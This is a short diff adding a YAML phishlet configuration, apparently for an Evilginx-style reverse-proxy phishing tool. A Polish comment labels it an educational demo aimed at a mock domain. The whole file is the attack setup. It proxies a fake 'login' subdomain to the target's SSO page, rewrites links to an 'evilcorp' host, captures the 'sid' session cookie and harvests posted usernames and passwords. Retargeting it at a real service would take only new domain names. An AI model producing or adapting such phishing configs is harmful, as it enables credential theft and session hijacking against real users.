@@ -1,0 +1,15 @@
+min_ver: '3.0.0'
+# Demo phishlet: subdomena + sub_filters (edukacja — cel własny/mock, nie realny serwis)
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'sso', domain: 'mockcorp.local', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'mockcorp.local', orig_sub: 'sso', domain: 'mockcorp.local', search: 'sso.mockcorp.local', replace: 'login.evilcorp.local', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.mockcorp.local'
+    keys: ['sid']
+credentials:
+  username: {key: 'user', search: '(.*)', type: 'post'}
+  password: {key: 'pass', search: '(.*)', type: 'post'}
+login:
+  domain: 'sso.mockcorp.local'
+  path: '/auth'
